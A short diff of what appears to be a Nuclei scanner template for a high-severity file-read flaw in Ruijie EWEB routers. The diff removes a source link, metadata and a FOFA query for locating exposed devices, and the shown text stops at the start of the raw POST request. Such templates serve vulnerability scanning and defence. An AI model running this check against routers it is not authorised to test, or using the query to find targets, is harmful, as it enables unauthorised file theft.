@@ -3,12 +3,8 @@ info:
   name: 锐捷EWEB路由器dhcp.php存在文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pik014tirthd5psr'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pik014tirthd5psr
-    fofa: title="锐捷网络-EWEB网管系统"
 http:
 - raw:
   - 'POST /ddi/server/login.php HTTP/1.1
